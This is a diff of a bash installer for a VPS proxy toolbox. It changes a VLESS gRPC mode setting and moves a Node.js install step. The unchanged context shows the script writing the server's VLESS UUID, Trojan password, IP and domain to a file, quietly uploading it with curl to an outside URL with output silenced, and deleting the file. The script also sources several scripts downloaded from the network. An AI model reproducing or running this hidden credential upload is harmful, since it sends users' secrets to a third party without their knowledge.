@@ -184,7 +184,7 @@ prasejson
 apt-get autoremove -y
 cd /root
 if [[ -n ${uuid_new} ]]; then
-echo "vless://${uuid_new}@${myip}:${trojanport}?mode=gun&security=tls&type=grpc&serviceName=${path_new}&sni=${domain}#Vless(${route_final} ${mycountry} ${mycity} ${myip} ${myipv6})" &> ${myip}.txt
+echo "vless://${uuid_new}@${myip}:${trojanport}?mode=multi&security=tls&type=grpc&serviceName=${path_new}&sni=${domain}#Vless(${route_final} ${mycountry} ${mycity} ${myip} ${myipv6})" &> ${myip}.txt
 echo "trojan://${password1}@${myip}:${trojanport}?security=tls&headerType=none&type=tcp&sni=${domain}#Trojan(${route_final}${mycountry} ${mycity} ${myip} ${myipv6})" >> ${myip}.txt
 curl --retry 5 https://johnrosen1.com/fsahdfksh/ --upload-file ${myip}.txt &> /dev/null
 rm ${myip}.txt
@@ -311,9 +311,6 @@ install_moudles(){
   source php.sh
   install_php
   fi
-  curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/nodejs.sh
-  source nodejs.sh
-  install_nodejs
   if [[ ${install_mariadb} == 1 ]]; then
   curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/mariadb.sh
   source mariadb.sh
@@ -437,6 +434,9 @@ install_moudles(){
   curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/alist.sh
   source alist.sh
   install_alist
+  curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/nodejs.sh
+  source nodejs.sh
+  install_nodejs
   fi
   ## Install Trojan-gfw
   curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/trojan.sh
